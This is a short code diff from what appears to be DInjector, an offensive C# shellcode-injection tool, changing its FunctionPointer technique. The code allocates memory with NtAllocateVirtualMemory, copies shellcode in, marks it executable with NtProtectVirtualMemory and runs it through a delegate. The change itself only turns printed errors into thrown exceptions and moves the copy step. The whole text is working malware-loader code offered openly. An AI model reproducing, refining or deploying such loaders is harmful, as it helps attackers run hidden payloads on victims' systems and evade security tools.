@@ -30,11 +30,11 @@ namespace DInjector
             if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(FunctionPointer) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
             else
-                Console.WriteLine($"(FunctionPointer) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
-
-            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
+                throw new Exception($"(FunctionPointer) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
 
             #endregion
+
+            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
 
             #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)
 
@@ -50,12 +50,12 @@ namespace DInjector
             if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(FunctionPointer) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
             else
-                Console.WriteLine($"(FunctionPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
+                throw new Exception($"(FunctionPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
+
+            #endregion
 
             pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(pFunction));
             f();
-
-            #endregion
         }
     }
 }
